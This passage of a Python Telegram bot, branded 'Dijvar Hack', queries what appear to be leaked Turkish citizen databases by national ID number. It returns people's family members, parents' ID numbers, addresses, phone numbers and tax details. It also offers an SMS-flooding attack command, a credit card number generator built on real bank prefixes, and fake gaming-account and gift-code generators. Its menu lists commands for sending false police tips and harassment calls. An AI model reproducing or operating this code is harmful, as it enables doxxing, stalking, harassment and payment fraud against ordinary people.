        bot.reply_to(message, '*⚠️ Lütfen geçerli bir T.C. kimlik numarası giriniz.\nÖrnek:* `/tcgsm 11111111110`', parse_mode="Markdown")
        return
    
    gsm_data = get_gsm_details(tc)

    if gsm_data.get("success"):
        tc_no = gsm_data["data"][0].get('TC', 'Bilinmiyor')  # T.C. kimlik numarasını al
        gsm_numbers = [entry.get('GSM', 'Bilinmiyor') for entry in gsm_data["data"]]  # Tüm GSM numaralarını al

        reply_message = f"🍀 Tc den Gsm Detayları:\n🔱 T.C. Kimlik No: {tc_no}\n"  # T.C. Kimlik No'yu ekle
        for index, gsm in enumerate(gsm_numbers, start=1):
            reply_message += f"Telefon No {index}: {gsm}\n"
            parse_mode="Markdown"
            
    else:
        reply_message = "GSM detayları alınamadı."

    bot.reply_to(message, reply_message)


                                                              
@bot.message_handler(commands=['sulale']) 
def sulale(message): 
    if message.chat.type != "private": 
        return 
 
    user_id = message.from_user.id 
    user_name=message.from_user.username 
 
    # Check if a parameter (TC) is provided 
    if len(message.text.split()) > 1: 
        tc = message.text.split()[1] 
        api_url = f"http://172.208.52.218/api/legaliapi/sulale.php?tc={tc}" 
         
        # Make request to the API 
        response = requests.get(api_url) 
         
        try: 
            # Attempt to parse the response as JSON 
            data = response.json() 
 
            # Check if any data is returned 
            if data and isinstance(data, list) and data[0].get("tc"): 
                # Increment kayit_sayisi for each record 
                kayit_sayisi = len(data) 
 
                text = f"╭─━━━━━━━━━━━━━─╮\n┃*Toplam:* `{kayit_sayisi}` *Kişi.*\n╰─━━━━━━━━━━━━━─╯" 
 
                for i, record in enumerate(data): 
                    yakınlık = record.get("yakinlik", "Bilgi Yok") 
                    tc_km = record.get("tc", "Bilgi Yok") 
                    adı = record.get("adi", "Bilgi Yok") 
                    soyadı = record.get("soyadi", "Bilgi Yok") 
                    doğum_tarihi = record.get("dtarih", "Bilgi Yok") 
                    anne_adi = record.get("anneadi", "Bilgi Yok") 
                    anne_tc = record.get("annetc", "Bilgi Yok") 
                    baba_adi = record.get("babaadi", "Bilgi Yok") 
                    baba_tc = record.get("babatc", "Bilgi Yok") 
                    nufüsil = record.get("il", "Bilgi Yok") 
                    nufüsilçe = record.get("ılce", "Bilgi Yok") 
                    uyruk = record.get("uy", "Bilgi Yok") 
 
                    record_text = (                  
                        f"\n╭─━━━━━━━━━━━━━─╮\n┃*Sonuç No:* `{i}`\n" 
                        f"┃─━━━━━━━━━━━━━─\n╭─━━━━━━━━━━━━━─╮\n┃*Adı:* `{adı}`\n" 
                        f"┃*Soyadı:* `{soyadı}`\n" 
                        f"┃*Yakinlik:* `{yakınlık}`\n" 
                        f"┃*TC Kimlik Numarası:* `{tc_km}`\n" 
                        f"┃*Doğum Tarihi:* `{doğum_tarihi}`\n" 
                        f"┃*Nüfus İL:* `{nufüsil}`\n" 
                        f"┃*Nüfus İLÇE:* `{nufüsilçe}`\n" 
                        f"┃*Anne Adı:* `{anne_adi}`\n" 
                        f"┃*Anne TC:* `{anne_tc}`\n" 
                        f"┃*Baba Adı:* `{baba_adi}`\n" 
                        f"┃*Baba TC:* `{baba_tc}`\n" 
                        f"┃*Uyruk:* `{uyruk}`\n" 
                        f"╰─━━━━━━━━━━━━━─╯\n\n" 
                    ) 
 
                    text += record_text 
 
                # Write all records to a file 
                with open('sulale.txt', 'w', encoding='utf-8') as file: 
                    file.write(text) 
 
                # Send the file to the user 
                bot.send_document(user_id, open('sulale.txt', 'rb'), caption=f"🍀Bilgiler Dosyanın İçinde🍀\n🤠{user_name}",reply_to_message_id=message.message_id) 
 
                # Delete the file after sending 
                os.remove('sulale.txt') 
            else: 
                bot.reply_to(message, "⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*", parse_mode="Markdown") 
        except ValueError: 
            bot.reply_to(message, "⚠️ API'den Yanıt alınamıyor. Lütfen Yönetici ile iletişime geçin!", parse_mode="Markdown") 
    else: 
        bot.reply_to(message, "*⚠️ Lütfen geçerli bir T.C. Kimlik Numarası girin!.\nÖrnek:* `/sulale 11111111110`", parse_mode="Markdown")
@bot.callback_query_handler(func=lambda call: call.data == "komutlar")
def komutlar(call):
    mesaj = "📚 Komutlar Menüsüne Hoş geldin!\n\n👪 Nüfus ve Vatandaşlık İşleri Bölümü\n\n🍀/sorgu • ad soyad tan bilgi verir\n🍀/tc • T.C den kişi bilgisi verir\n🍀/aile • T.C'den Kişi aile bilgisi verir\n🍀/sulale • T.c'den kişi sülale blgi verir\n🍀/adres  •T.C'den Kişi adresini verir\n🍀/ailepro • T.c'den aile detaylı verir\n🍀/medeni • T.c'den medeni hali verir\n🍀/tcpro • T.c'den kişi detaylı bilgi verir \n🍀/kizlik •T.c'den kişi kızlık soyad verir\n🍀/tcplaka • T.C'den plaka bilgi verir\n🍀/plaka • Plaka'dan Ceza Bilgisi Verir\n🍀/haciz • T.C'den Kişi haciz bilgi verir\n🍀/iban • IBAN'dan Kişi Bilgileri Verir\n🍀/ihbar • Adres'e ihbar Basar\n🍀/vergid  •  Kişiye ait vergi bilgi verir  \n\n📱 Telefon Sorgu BÖLÜMÜ\n\n🍀/gsmtc  • GSM'den T.C Verir \n🍀/tcgsm • T.C'den GSM Verir\n🍀/sms • GSM'ye Sms Saldırısı Yapar\n🍀/arama • Telefona arama Gönderir  \n🍀/operator • GSM'den Operatör Verir \n\n🎉 Eğlence BÖLÜMÜ\n\n🍀/ip • ip den konum verir\n🍀/index • URL'den site indexini verir \n🍀/yaz • Girilen Mesajı Deftere yazar\n🍀/dolar • Güncel döviz kurunu verir\n"
    geri = telebot.types.InlineKeyboardButton("Geri", callback_data="geri")
    butonlar = telebot.types.InlineKeyboardMarkup()
    butonlar.add(geri)
    bot.edit_message_text(mesaj, call.message.chat.id, call.message.message_id, reply_markup=butonlar)
    
COCUK_API = "https://legendapiservices.cfd/alwaydoruspuevladıdır/api/cocuk.php?tc="

@bot.message_handler(commands=['cocuk'])
def handle_cocuk_command(message):
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name
 
    chat_id = message.chat.id
 
        
    try:
        
        tc = message.text.split()[1]
        
        
        api_response = requests.get(COCUK_API + tc).json()

        
        user_info = api_response.get("data", [])

        time.sleep(1)
        response_text = (
            f""
            f""
            f""
        )

        for info in user_info:
            response_text += (
                f"\n"
                f"╭━━━━━━━━━━━━━━\n"
                f"┃➥ TC: {info['TC']}\n"
                f"┃➥ ADI: {info['ADI']}\n"
                f"┃➥ SOY ADI: {info['SOYADI']}\n"
                f"┃➥ DOĞUM TARİHİ: {info['DOGUMTARIHI']}\n"
                f"┃➥ İL: {info['NUFUSIL']}\n"
                f"┃➥ İLÇE: {info['NUFUSILCE']}\n"
                f"┃➥ ANNE ADI: {info['ANNEADI']}\n"
                f"┃➥ ANNE TC: {info['ANNETC']}\n"
                f"┃➥ BABA ADI: {info['BABAADI']}\n"
                f"┃➥ BABA TC: {info['BABATC']}\n"
                f"┃➥ UYRUK: {info['UYRUK']}\n"
                f"┃➥ YAKINLIK: {info['Yakınlık']}\n"
                f"╰━━━━━━━━━━━━━━"
            )

        
        bot.reply_to(message, response_text)
        

    except IndexError:

        bot.reply_to(message, "Lütfen geçerli bir TC kimlik numarası girin.")
        
    except Exception as e:       
        bot.reply_to(message, f"Bilgiler Bulunamadı")   
        
YEGEN_API = "https://legendapiservices.cfd/alwaydoruspuevladıdır/api/yegen.php?tc="

@bot.message_handler(commands=['yegen'])
def handle_yegen_command(message):
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name
 
    chat_id = message.chat.id
 
    
        
    try:
        
        tc = message.text.split()[1]
        
        
        api_response = requests.get(YEGEN_API + tc).json()

        
        user_info = api_response.get("Yeğenler", [])

 
        response_text = (
            f""
            f""
            f""
        )

        for info in user_info:
            response_text += (
                f"\n"
                f"╭━━━━━━━━━━━━━━\n"
                f"┃➥ TC: {info['TC']}\n"
                f"┃➥ ADI: {info['ADI']}\n"
                f"┃➥ SOY ADI: {info['SOYADI']}\n"
                f"┃➥ DOĞUM TARİHİ: {info['DOGUMTARIHI']}\n"
                f"┃➥ İL: {info['NUFUSIL']}\n"
                f"┃➥ İLÇE: {info['NUFUSILCE']}\n"
                f"┃➥ ANNE ADI: {info['ANNEADI']}\n"
                f"┃➥ ANNE TC: {info['ANNETC']}\n"
                f"┃➥ BABA ADI: {info['BABAADI']}\n"
                f"┃➥ BABA TC: {info['BABATC']}\n"
                f"┃➥ UYRUK: {info['UYRUK']}\n"
                f"┃➥ YAKINLIK: {info['Yakinlik']}\n"
                f"╰━━━━━━━━━━━━━━"
            )

        
        bot.reply_to(message, response_text)

    except IndexError:
        
        bot.reply_to(message, "Lütfen geçerli bir TC kimlik numarası girin.")
    except Exception as e:
        
        bot.reply_to(message, f"Bilgiler Bulunamadı")
        
        
    
    
    
   

    
    
          
                  
@bot.message_handler(commands=['index'])
def index(message):
    if message.chat.type != "private":
        return

    

    try:
        site_url = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir Site URL girin!*\n\n*Örnek:* `/index https://google.com`", parse_mode="Markdown")
        return

    if not site_url.startswith("http://") and not site_url.startswith("https://"):
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Üzgünüm Hatalı URL girdiniz Lütfen geçerli bir URL girin*\n\n*Örnek*: `/index https://instagram.com`", parse_mode="Markdown")
        return

    response = requests.get(site_url)

    if response.status_code == 200:
        file_name = "dijvarhack.html"
        file_content = response.text
        
        with open(file_name, 'w') as file:
            file.write(file_content)

        with open(file_name, 'rb') as file:
            bot.send_chat_action(message.chat.id, 'typing')
            time.sleep(0.1)
            bot.send_document(message.chat.id, file)

        os.remove(file_name)
    else:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Üzgünüm bu siteye Ait Bir index Çekilemiyor!*", parse_mode='Markdown')



support_channel_id = -1002122807954

@bot.message_handler(commands=['sms']) # 
def send_sms(message):
    chat_id = message.chat.id
    user_input = message.text.split(' ', 1)

    if len(user_input) != 2:
        bot.send_message(chat_id, '*⚠️ Lütfen Geçerli Bir telefon numarası girin!\n\nÖrnek:* `/sms 5555555555`', parse_mode='Markdown')
        return

    gsm_number = user_input[1]
    api_url = f'https://sowixapi.online/api/sowixapi/sms.php?telno={gsm_number}'

    
    start_message = bot.send_message(chat_id, "Smsler Gönderiliyor...")

    
    response = requests.get(api_url)

    if response.status_code == 200:
        
        bot.send_message(chat_id, "Smsler Başarılı Bir Şekilde Gönderildi!\n\n@alexhex1 </>")
    else:
        bot.send_message(chat_id, "SMS gönderirken bir hata oluştu.") #                                                                                                                                                                             
   
@bot.callback_query_handler(func=lambda call: call.data == "geri")
def geri(call):
    mesaj = "👋 Merhaba! Benim adım Dijvar Hack bot sorgu yapmak için buradayım\nBeni grubunuza ekleyerek veya komutlar butonuna tıklayarak komutlarımı görebilir ve kullanabilirsiniz.\n\nEn son güncellemeler hakkında bilgi almak için @dijvarhack kanalıma katılın.\n\n⛔ Not: Bot Dijvarhack  kanalına özel olarak yapılmıştır. Botu kullanmak için Dijvar Hack'e katılmanız gerekmektedir. Katıldıktan sonra çıkış yaparsanız bir daha botu kullanamazsınız."
    komutlar = telebot.types.InlineKeyboardButton("📜Komutlar", callback_data="komutlar")
    majeste_sohbet = telebot.types.InlineKeyboardButton(" ➕ beni grubuna ekle", url="https://t.me/DijvarSorgu_bot?startgroup=CallToneBot")
    iletisim = telebot.types.InlineKeyboardButton("🙋owner", url="https://t.me/alexhex1")
    butonlar = telebot.types.InlineKeyboardMarkup()
    butonlar.row(komutlar)
    butonlar.row(majeste_sohbet, iletisim)
    bot.edit_message_text(mesaj, call.message.chat.id, call.message.message_id, reply_markup=butonlar)
     
@bot.message_handler(commands=['ccuret'])
def rcc_command(message):
  binhs = ['521807', '483673', '510118', '428220', '521848', '427311', '537058', '450634', '540061', '542374', '432285', '531389', '540435', '411944', '432072', '524347', '521827']
  bin = random.choice(binhs)
  numbers = '1234567890'
  number = str(''.join((random.choice(numbers) for i in range(10))))
  ay = random.randint(1,9)
  yil = random.randint(2024,2030)
  cvv = random.randint(111,999)
  bot.reply_to(message, "Cc Üretiliyor Lütfen 3 Saniye Bekleyin")
  time.sleep(3)
  card = f'{bin}{number}|0{ay}|{yil}|{cvv}'
  bot.reply_to(message, f'{card}')

@bot.message_handler(commands=['pubg'])
def rpubg_command(message):
 mail = '@gmail.com'
 anan = 'abcdefghihjklmnoprstuvyzxqw'
 user = 'abcdefghihjklmnoprstuvyzxqw'
 ıss = 'ABCDEFGHIJKLMNOPRSTEUVYZ'
 ısss = str(''.join((random.choice(ıss) for i in range(2))))
 userr = '1234567890'
 uss = str(''.join((random.choice(userr) for i in range(2))))
 uss = str(''.join((random.choice(userr) for i in range(3))))
 us = str(''.join((random.choice(user) for i in range(7))))
 us4 = str(''.join((random.choice(anan) for i in  range(8))))
 username = us + mail
 password = us4
 pubg = f'{username}:{password}'
 bot.reply_to(message,f'{pubg}')

@bot.message_handler(commands=['playkod'])
def playkod_command(message):
  ıss = 'ABCDEFGHIJKLMNOPRSTEUVYZ'
  ısss = str(''.join((random.choice(ıss) for i in range(2))))
  userr = '1234567890'
  uss = str(''.join((random.choice(userr) for i in range(2))))
  uss = str(''.join((random.choice(userr) for i in range(3))))
  baba = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
  baba1 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
  baba2 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
  baba3 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
  baba4 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
  de = '-'
  user = 'SHL7-UA6Q-FRLT-SFMM-GHM8'
  us = str(''.join((random.choice(user) for i in range(7))))
  username = '+20122' + us
  password = '0122' + us
  kod = str(''.join((random.choice(baba) for i in range(4))))
  kod1 = str(''.join((random.choice(baba1) for i in range(4))))
  kod2 = str(''.join((random.choice(baba2) for i in range(4))))
  kod3 = str(''.join((random.choice(baba3) for i in range(4))))
  kod4 = str(''.join((random.choice(baba4) for i in range(4))))
  bot.reply_to(message, 'Play Kod Üretiliyor Lütfen 3 Saniye Bekleyiniz..') 
  time.sleep(3)
  play = f'{kod}{de}{kod1}{de}{kod2}{de}{kod3}{de}{kod4}\n\n👆Play Kod Başarıyla Üretildi Tekrar Üretmesi İçin /playkod komutunu kullanın.\n\nYapımcı : @alexhex1 '
  bot.reply_to(message,f'{play}')      
  
plaka_bilgileri = {
    '52AAC542': {'borç': '300 TL', 'TC': '34567890123', 'ad_soyad': 'Mehmet Yıldız', 'ceza': '100 TL', 'marka_model': 'Renault Clio', 'renk': 'Siyah', 'sigorta_durumu': 'Aktif'},
    '06XYZ456': {'borç': '0 TL', 'TC': '23456789012', 'ad_soyad': 'Ayşe Kaya', 'ceza': '0 TL', 'marka_model': 'Toyota Corolla', 'renk': 'Beyaz', 'sigorta_durumu': 'Pasif'},
    '34DEF789': {'borç': '200 TL', 'TC': '45678901234', 'ad_soyad': 'Fatma Demir', 'ceza': '850 TL', 'marka_model': 'Ford Focus', 'renk': 'Kırmızı', 'sigorta_durumu': 'Aktif'},
    # Diğer plakaları da ekleyelim.
    '07GHI123': {'borç': '150 TL', 'TC': '56789012345', 'ad_soyad': 'Ali Can', 'ceza': '900 TL', 'marka_model': 'Honda Civic', 'renk': 'Mavi', 'sigorta_durumu': 'Pasif'},
    '89JKL456': {'borç': '100 TL', 'TC': '67890123456', 'ad_soyad': 'Zeynep Yılmaz', 'ceza': '950 TL', 'marka_model': 'Volkswagen Golf', 'renk': 'Gri', 'sigorta_durumu': 'Aktif'},
    '90STU567': {'borç': '250 TL', 'TC': '34567890123', 'ad_soyad': 'Selin Korkmaz', 'ceza': '200 TL', 'marka_model': 'Ford Focus', 'renk': 'Gri', 'sigorta_durumu': 'Aktif'},
    '12UVW890': {'borç': '150 TL', 'TC': '45678901234', 'ad_soyad': 'Umut Yıldız', 'ceza': '100 TL', 'marka_model': 'Honda Accord', 'renk': 'Beyaz', 'sigorta_durumu': 'Pasif'},
    '34WXY012': {'borç': '200 TL', 'TC': '56789012345', 'ad_soyad': 'Zeynep Demir', 'ceza': '150 TL', 'marka_model': 'Toyota Camry', 'renk': 'Siyah', 'sigorta_durumu': 'Aktif'},
    '56XYZ345': {'borç': '100 TL', 'TC': '67890123456', 'ad_soyad': 'Xavier Tekin', 'ceza': '80 TL', 'marka_model': 'Volkswagen Passat', 'renk': 'Mavi', 'sigorta_durumu': 'Pasif'},
    '78ABC678': {'borç': '250 TL', 'TC': '78901234567', 'ad_soyad': 'Ahmet Yılmaz', 'ceza': '200 TL', 'marka_model': 'Opel Corsa', 'renk': 'Gri', 'sigorta_durumu': 'Aktif'},
    '90CDE901': {'borç': '150 TL', 'TC': '89012345678', 'ad_soyad': 'Ceren Kaya', 'ceza': '100 TL', 'marka_model': 'Ford Fiesta', 'renk': 'Beyaz', 'sigorta_durumu': 'Pasif'},
    '12EFG234': {'borç': '200 TL', 'TC': '90123456789', 'ad_soyad': 'Eren Yıldırım', 'ceza': '150 TL', 'marka_model': 'Renault Megane', 'renk': 'Siyah', 'sigorta_durumu': 'Aktif'},
    '34GHI567': {'borç': '100 TL', 'TC': '01234567890', 'ad_soyad': 'Gizem Tekin', 'ceza': '80 TL', 'marka_model': 'Honda Civic', 'renk': 'Mavi', 'sigorta_durumu': 'Pasif'},
    '56IJK890': {'borç': '250 TL', 'TC': '12345678901', 'ad_soyad': 'İbrahim Yılmaz', 'ceza': '200 TL', 'marka_model': 'Toyota Corolla', 'renk': 'Gri', 'sigorta_durumu': 'Aktif'},
    
}

# exxen.txt dosyasından hesap bilgilerini okuyan fonksiyon
def get_exxen_account():
    with open('pubg.txt', 'r') as file:
        lines = file.readlines()
        username = lines[0].strip()
        password = lines[1].strip()
    return username, password







TCGSM_API = "https://legendapiservices.cfd/alwaydoruspuevladıdır/api/tcgsm.php?tc="

@bot.message_handler(commands=['tcgsm'])
def handle_tcgsm(message):

    user_id = message.from_user.id
    user_name = message.from_user.first_name
 
    bot.send_message(user_id, f"İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...", parse_mode="Markdown")
    try:
        
        tc_number = message.text.split()[1]

        
        api_response = requests.get(TCGSM_API + tc_number).json()

        
        if api_response.get("success") == "true" and api_response.get("number") > 0:
            data = api_response.get("data")[0]
            gsm = data.get("GSM")
            tc = data.get("TC")

            
            result_text = f"╭━━━━━━━━━━━━━╮\n┃➥ GSM: {gsm}\n┃➥ TC: {tc}\n╰━━━━━━━━━━━━━╯"
            bot.send_message(message.chat.id, result_text)
        else:
           
            bot.send_message(message.chat.id, "Data bulunamadı.")
    except IndexError:
        time.sleep(1)
        bot.send_message(message.chat.id, "Lütfen geçerli bir TC numarası girin.")




TC_API = "https://legendapiservices.cfd/alwaydoruspuevladıdır/api/tc.php?tc="

@bot.message_handler(commands=['tcc'])  
def handle_tc_command(message):
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name
 
    bot.send_message(user_id, f"İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...", parse_mode="Markdown")
    try:
        
        tc = message.text.split()[1]
        
        
        api_response = requests.get(TC_API + tc).json()

        
        adi = api_response.get("ADI", "")
        soyadi = api_response.get("SOYADI", "")
        dogum_tarihi = api_response.get("DOĞUMTARIHI", "")
        il = api_response.get("NUFUSIL", "")
        ilce = api_response.get("NUFUSILCE", "")
        anne_adi = api_response.get("ANNEADI", "")
        anne_tc = api_response.get("ANNETC", "")
        baba_adi = api_response.get("BABAADI", "")
        baba_tc = api_response.get("BABATC", "")
        yas = api_response.get("YAŞ", "")

        
        response_text = (
            f"╭━━━━━━━━━━━━━━\n"
            f"┃➥ TC: {tc}\n"
            f"┃➥ ADI: {adi}\n"
            f"┃➥ SOY ADI: {soyadi}\n"
            f"┃➥ DOĞUM TARİHİ: {dogum_tarihi}\n"
            f"┃➥ İL: {il}\n"
            f"┃➥ İLÇE: {ilce}\n"
            f"┃➥ ANNE ADI: {anne_adi}\n"
            f"┃➥ ANNE TC: {anne_tc}\n"
            f"┃➥ BABA ADI: {baba_adi}\n"
            f"┃➥ BABA TC: {baba_tc}\n"
            f"┃➥ YAŞ: {yas}\n"
            f"╰━━━━━━━━━━━━━━"
        )

        
        bot.reply_to(message, response_text)

    except IndexError:
       
        bot.reply_to(message, "Geçerli Bir TC Kimlik Numarası Girin.")
    except Exception as e:
        time.sleep(1)
        bot.reply_to(message, f"Data bulunamadı.")




@bot.message_handler(commands=['plaka'])
def handle_plaka(message):
    text = message.text.split()
    if len(text) < 2:
        bot.reply_to(message,'*⚠️ Lütfen Geçerli Bir Plaka girin!\n\nÖrnek:* `/plaka 52AAC542`', parse_mode='Markdown')
  
        return
    
    plaka = text[1].upper()  # Plaka numarasını büyük harf yaparak al
    if plaka in plaka_bilgileri:
        bilgiler = plaka_bilgileri[plaka]
        
        response_text = "╭─━━━━━━━━━━━━━─╮\n┃@alexhex1 - PLAKA BORÇ\n┃─━━━━━━━━━━━━━─\n"
        response_text += (
            f"┃ Plaka: {plaka}\n"
            f"┃ Borç: {bilgiler['borç']}\n"
            f"┃ TC Kimlik No: {bilgiler['TC']}\n"
            f"┃ Ad Soyad: {bilgiler['ad_soyad']}\n"
            f"┃ Ceza: {bilgiler['ceza']}\n"
            f"┃ Marka ve Model: {bilgiler['marka_model']}\n"
            f"┃ Aracın Rengi: {bilgiler['renk']}\n"
            f"┃ Sigorta Durumu: {bilgiler['sigorta_durumu']}\n"
        )
        response_text += "╰─━━━━━━━━━━━━━─╯"
        
        bot.reply_to(message, response_text)
    else:
        bot.reply_to(message, "Girilen plaka numarasına ait bilgi bulunamadı.")



@bot.message_handler(commands=['adres'])
def adress_sorgu(message):
    try:
        chat_id = message.chat.id
        tc_number = message.text.split()[1]

        url = f"https://tsgchecker.tsgmods.com.tr/yunus/adres.php?tc={tc_number}"
        response = requests.get(url)
        data = response.json()

        if "success" in data and data["success"]:
            adres_data = data["data"]
            adres_message = f"""
➥ Kimlik No: {adres_data["TC"]}
➥ Ad Soyad: {adres_data["AdSoyad"]}
➥ Doğum Yeri: {adres_data["DogumYeri"]}
➥ Vergi Numarası:  {adres_data["VergiNumarasi"]}
➥ İkametgah: {adres_data["Ikametgah"]}
➥ auth: @alexhex1

"""

            bot.reply_to(message, adres_message)
        else:
            bot.reply_to(message, "Bu TC numarasına ait adres bilgisi bulunamadı.")
    except IndexError:
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/adres 11111111110`', parse_mode='Markdown')
  


@bot.message_handler(commands=['tckn'])
def tc(message):
    chat_id = message.chat.id
    # Kullanıcının mesajı boş değilse ve TC numarası varsa işlem yap
    if len(message.text.split()) > 1:
        tc_number = message.text.split()[1]
        url = f'http://172.208.52.218/api/legaliapi/tc.php?tc={tc_number}'
        response = requests.get(url)
        data = response.json()['data']  # API yanıtındaki 'data' alanını al
        # API yanıtındaki belirli alanları alarak düzenli bir mesaj oluştur
        ad = data.get('ADI', 'Bilinmiyor')
        soyad = data.get('SOYADI', 'Bilinmiyor')
        dogum_tarihi = data.get('DOGUMTARIHI', 'Bilinmiyor')
        nufus_il = data.get('NUFUSIL', 'Bilinmiyor')
        nufus_ilce = data.get('NUFUSILCE', 'Bilinmiyor')
        anne_adi = data.get('ANNEADI', 'Bilinmiyor')
        anne_tc = data.get('ANNETC', 'Bilinmiyor')
        baba_adi = data.get('BABAADI', 'Bilinmiyor')
        baba_tc = data.get('BABATC', 'Bilinmiyor')
        gsm_numaralari = ", ".join(data.get('gsm', ['Bilinmiyor']))
        uyruk = data.get('UYRUK', 'Bilinmiyor')
        kişi_id = data.get('id', 'Bilinmiyor')
        formatted_message = f"ID: {kişi_id}\nAd: {ad}\nSoyad: {soyad}\nDoğum Tarihi: {dogum_tarihi}\nNüfus İli: {nufus_il}\nNüfus İlçe: {nufus_ilce}\nAnne Adı: {anne_adi}\nAnne TC: {anne_tc}\nBaba Adı: {baba_adi}\nBaba TC: {baba_tc}\nUyruk: {uyruk}\nKişinin TC'si: {tc_number}"
        bot.send_message(chat_id, formatted_message)
    tc = message.text.split()[1] if len(message.text.split()) > 1 else None

    if not tc:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/tc 11111111110`', parse_mode='Markdown')
        return





@bot.message_handler(commands=['sorgu'])
def kimlik_sorgu(message):
    try:
        chat_id = message.chat.id
        parameters = ' '.join(message.text.split()[1:]).split('-')[1:]
        query = {}
        for param in parameters:
            key_value = param.split()
            if len(key_value) == 2:
                key, value = key_value
                key = key.strip().lower()
                query[key] = value.strip()
        
        if query:
            # API URL'lerini belirleme
            if 'ilce' in query:
                url = f"http://172.208.52.218/api/legaliapi/adsoyadililce.php?{'&'.join([f'{key}={value}' for key, value in query.items()])}"
                response = requests.get(url)
                data = response.json()
                if "status" in data and data["status"] == "success":
                    person_info = ""
                    for person_data in data["data"]:
                        for key, value in person_data.items():
                            person_info += f"{key.capitalize()}: {value}\n"
                        person_info += "\n\n"
                    bot.reply_to(message, person_info)
                else:
                    bot.reply_to(message, "Böyle bir kişi bilgisi bulunamadı.")
            elif 'il' in query or ('ad' in query and 'soyad' in query):
                if 'il' in query:
                    url = f"http://172.208.52.218/api/legaliapi/adsoyadil.php?{'&'.join([f'{key}={value}' for key, value in query.items()])}"
                else:
                    url = f"http://172.208.52.218/api/legaliapi/adsoyad.php?{'&'.join([f'{key}={value}' for key, value in query.items()])}"
                
                response = requests.get(url)
                data = response.json()
                
                if "status" in data and data["status"] == "success":
                    filename = f"adsoyadsorgu.txt"
                    with open(filename, 'w', encoding='utf-8') as file:
                        for person_data in data["data"]:
                            for key, value in person_data.items():
                                file.write(f"{key.capitalize()}: {value}\n")
                            file.write("\n\n")
                    
                    with open(filename, 'rb') as file:
                        bot.send_document(chat_id, file)
                    
                    os.remove(filename)  # Dosyayı gönderdikten sonra sil
                else:
                    bot.reply_to(message, "Böyle bir kişi bilgisi bulunamadı.")
        else:
           bot.reply_to(message, "*⚠️ Geçersiz komut kullanım.!.\nÖrnek:* `/sorgu -ad abdulselam -soyad deniz -il istanbul -ilce büyükçekmece`\n*Eğer kişi 2 ismi varsa\n Örnek: -ad azat+can diğer herşey aynı*", parse_mode="Markdown")
    except IndexError:
        bot.reply_to(message, "*⚠️ Geçersiz komut kullanım.!.\nÖrnek:* `/sorgu -ad abdulselam -soyad deniz -il istanbul -ilce büyükçekmece`\n*Eğer kişi 2 ismi varsa\n Örnek: -ad azat+can diğer herşey aynı*")


            


@bot.message_handler(commands=['aile'])
def aile_sorgu(message):
    try:
        chat_id = message.chat.id
        tc_number = message.text.split()[1]

        url = f"https://sowixapi.online/api/sowixapi/aile.php?tc={tc_number}"
        response = requests.get(url)
        data = response.json()

        if "success" in data and data["success"]:
            family_info = ""
            for member_data in data["data"]:
                for key, value in member_data.items():
                    family_info += f"{key.capitalize()}: {value}\n"
                family_info += "\n"
            
            bot.reply_to(message, family_info)
        else:
            bot.reply_to(message, "Aile bilgisi bulunamadı.")
    except IndexError:
        bot.reply_to(message, "*⚠️ Lütfen geçerli bir T.C. Kimlik Numarası girin!.\nÖrnek:* `/aile 11111111110`", parse_mode="Markdown")
 
 
 
@bot.message_handler(commands=['ayak'])
def penis_size(message):
    if message.chat.type != "private":
        return
    

    try:
        query = message.text.strip().split(' ')
        if len(query) != 2 or len(query[1]) != 11:
        	bot.send_chat_action(message.chat.id, 'typing')
        	time.sleep(0.1)
        	bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/ayak 11111111110`", parse_mode='Markdown')
        	return
        penis_length = random.choice([6, 7, 8, 9, 57, 32, 30, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50])
        penis_unit = 'NO'
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, f"╭─━━━━━━━━━━━━━─╮\n┃*T.C* `{query[1]}`\n┃*ayak Boyutu:* `{penis_length}{penis_unit}`\n╰─━━━━━━━━━━━━━─╯", parse_mode='Markdown')
        increment_query_count()
    except IndexError:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/penis 11111111110`", parse_mode='Markdown')




API_ENDPOINT = 'https://apis.xditya.me/write?text={}'

@bot.message_handler(commands=['yaz'])
def yaz(message):
    if message.chat.type != "private":
        return

    
    try:
        text = message.text.split(maxsplit=1)[1]
       
        api_url = API_ENDPOINT.format(text)
        response = requests.get(api_url)
        
        if response.status_code == 200:
            bot.send_photo(message.chat.id, response.content)
        else:
            bot.send_message(message.chat.id, "⚠️ *API'de sorun var Lütfen Yönetici ile iletişime geçin!.*", parse_mode="Markdown")
    
    except IndexError:
        bot.send_message(message.chat.id, "*⚠️ Lütfen geçerli bir Mesaj girin!.\nÖrnek:* `/yaz Biji Serok Apo`", parse_mode="Markdown")

@bot.message_handler(commands=['operator'])
def operator(message):
    if message.chat.type != "private":
        return


    user_first_name = message.from_user.first_name

    gsm = message.text.split()[1] if len(message.text.split()) > 1 else None

    if not gsm:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
